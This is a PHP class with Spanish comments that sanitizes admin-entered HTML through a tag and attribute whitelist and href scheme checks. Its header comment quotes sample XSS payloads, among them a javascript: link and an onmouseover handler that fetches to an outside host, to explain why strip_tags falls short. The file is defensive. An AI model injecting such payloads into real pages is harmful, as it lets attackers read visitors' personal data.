<?php
/**
 * ============================================================================
 *  HtmlSeguro — dejar pasar el formato y nada más.
 * ============================================================================
 *
 *  Algunos campos del panel admiten formato: negritas, párrafos, enlaces. Ese
 *  HTML se imprime sin escapar en la web pública, así que decidir qué
 *  sobrevive es lo único que separa «un editor da formato a un texto» de «un
 *  editor ejecuta código en el navegador de cada visitante».
 *
 *  ── Por qué no vale strip_tags ───────────────────────────────────────────
 *
 *  strip_tags() quita las etiquetas que no están en la lista, pero conserva
 *  ÍNTEGROS los atributos de las que sí están. Todo esto lo daba por bueno:
 *
 *      <a href="javascript:...">                 → se ejecuta al pulsar
 *      <a onmouseover="fetch('//fuera/'+...)">   → se ejecuta al pasar el ratón
 *      <p onload="...">  <li onclick="...">      → se ejecutan solos
 *
 *  Bloqueaba <script> y dejaba abiertas todas las demás puertas. En la página
 *  de voluntariado, donde se teclean DNI, teléfono y dirección, un script
 *  inyectado puede leer cada campo mientras se escribe.
 *
 *  ── Qué hace esto en su lugar ────────────────────────────────────────────
 *
 *  Se analiza el HTML como árbol y se reconstruye:
 *
 *   · Las etiquetas fuera de la lista se DESENVUELVEN, no se borran: el texto
 *     que llevaban dentro se conserva. Vaciar un párrafo porque el editor usó
 *     una etiqueta de más sería peor que quitarle el formato.
 *   · De <script>, <style>, <iframe> y similares se borra también el
 *     contenido: ahí dentro no hay texto que salvar.
 *   · Se eliminan TODOS los atributos salvo los declarados. Es lista blanca:
 *     un atributo nuevo o raro no entra por defecto.
 *   · En href sólo se admiten http, https, mailto, tel, anclas y rutas
 *     relativas. javascript:, data: y vbscript: quedan fuera.
 *   · Todo enlace que salga del sitio recibe rel="noopener noreferrer".
 */

declare(strict_types=1);

namespace Intranet\Core;

use DOMDocument;
use DOMElement;
use DOMNode;

final class HtmlSeguro
{
    /** Etiquetas admitidas y, por cada una, sus atributos admitidos. */
    private const PERMITIDAS = [
        'p'      => [],
        'br'     => [],
        'strong' => [],
        'b'      => [],
        'em'     => [],
        'i'      => [],
        'u'      => [],
        'ul'     => [],
        'ol'     => [],
        'li'     => [],
        'a'      => ['href', 'title'],
        'h2'     => [],
        'h3'     => [],
        'h4'     => [],
        'blockquote' => [],
        'small'  => [],
        'span'   => [],
    ];

    /** Aquí el contenido tampoco se salva: se va entero con la etiqueta. */
    private const CON_CONTENIDO = ['script', 'style', 'iframe', 'object', 'embed', 'form', 'svg', 'math'];

    /** Esquemas admitidos en un href. */
    private const ESQUEMAS = ['http', 'https', 'mailto', 'tel'];

    public static function limpiar(?string $html): string
    {
        $html = trim((string) $html);

        if ($html === '') {
            return '';
        }

        // Sin etiquetas no hay nada que analizar: se escapa y se devuelve.
        if (!str_contains($html, '<')) {
            return htmlspecialchars($html, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
        }

        $doc = new DOMDocument('1.0', 'UTF-8');

        // La marca de orden de bytes obliga a libxml a leerlo como UTF-8 sin
        // añadir <html> ni <body> alrededor.
        $anterior = libxml_use_internal_errors(true);

        $cargado = $doc->loadHTML(
            "\xEF\xBB\xBF<div id=\"raiz-html-seguro\">" . $html . '</div>',
            LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD | LIBXML_NONET
        );

        libxml_clear_errors();
        libxml_use_internal_errors($anterior);

        if (!$cargado) {
            // HTML irrecuperable: mejor el texto plano que arriesgarse.
            return htmlspecialchars(strip_tags($html), ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
        }

        $raiz = $doc->getElementById('raiz-html-seguro');

        if (!$raiz instanceof DOMElement) {
            return htmlspecialchars(strip_tags($html), ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
        }

        self::depurar($raiz);

        $salida = '';

        foreach ($raiz->childNodes as $hijo) {
            $salida .= $doc->saveHTML($hijo);
        }

        return trim($salida);
    }

    /** Recorre el árbol de abajo arriba, quitando lo que no está permitido. */
    private static function depurar(DOMNode $nodo): void
    {
        // Se copia la lista de hijos: quitar nodos mientras se recorre la
        // colección viva se salta elementos.
        $hijos = [];

        foreach ($nodo->childNodes as $hijo) {
            $hijos[] = $hijo;
        }

        foreach ($hijos as $hijo) {
            if (!$hijo instanceof DOMElement) {
                continue;                       // texto y comentarios: se verá abajo
            }

            $etiqueta = strtolower($hijo->nodeName);

            if (in_array($etiqueta, self::CON_CONTENIDO, true)) {
                $hijo->parentNode?->removeChild($hijo);

                continue;
            }

            self::depurar($hijo);

            if (!array_key_exists($etiqueta, self::PERMITIDAS)) {
                self::desenvolver($hijo);

                continue;
            }

            self::limpiarAtributos($hijo, $etiqueta);
        }

        // Los comentarios pueden esconder trozos de marcado para navegadores
        // antiguos; no aportan nada al contenido.
        foreach ($hijos as $hijo) {
            if ($hijo->nodeType === XML_COMMENT_NODE) {
                $hijo->parentNode?->removeChild($hijo);
            }
        }
    }

    /** Quita la etiqueta pero deja su contenido en el sitio que ocupaba. */
    private static function desenvolver(DOMElement $elemento): void
    {
        $padre = $elemento->parentNode;

        if ($padre === null) {
            return;
        }

        while ($elemento->firstChild !== null) {
            $padre->insertBefore($elemento->firstChild, $elemento);
        }

        $padre->removeChild($elemento);
    }

    private static function limpiarAtributos(DOMElement $elemento, string $etiqueta): void
    {
        $admitidos = self::PERMITIDAS[$etiqueta];
        $quitar    = [];

        foreach ($elemento->attributes as $atributo) {
            if (!in_array(strtolower($atributo->nodeName), $admitidos, true)) {
                $quitar[] = $atributo->nodeName;
            }
        }

        foreach ($quitar as $nombre) {
            $elemento->removeAttribute($nombre);
        }

        if ($etiqueta !== 'a' || !$elemento->hasAttribute('href')) {
            return;
        }

        $destino = self::hrefSeguro($elemento->getAttribute('href'));

        if ($destino === null) {
            $elemento->removeAttribute('href');

            return;
        }

        $elemento->setAttribute('href', $destino);

        // Un enlace externo que abre en otra pestaña da a la página de destino
        // acceso a la nuestra por window.opener si no se corta.
        if (preg_match('#^https?://#i', $destino)) {
            $elemento->setAttribute('rel', 'noopener noreferrer');
        }
    }

    /** Devuelve el href si es admisible, o null si no lo es. */
    private static function hrefSeguro(string $href): ?string
    {
        $limpio = trim($href);

        // Se quitan los caracteres de control: «java\0script:» y «java\tscript:»
        // sortean una comprobación ingenua y el navegador los ejecuta igual.
        $limpio = preg_replace('/[\x00-\x20\x7F]+/u', '', $limpio) ?? '';

        if ($limpio === '') {
            return null;
        }

        // Ancla o ruta relativa: no hay esquema que validar.
        if (str_starts_with($limpio, '#') || str_starts_with($limpio, '/')) {
            return $href;
        }

        if (preg_match('#^([a-z][a-z0-9+.-]*):#i', $limpio, $m) === 1) {
            return in_array(strtolower($m[1]), self::ESQUEMAS, true) ? $href : null;
        }

        // Sin esquema y sin barra inicial: relativa («voluntariado/»).
        return $href;
    }
}
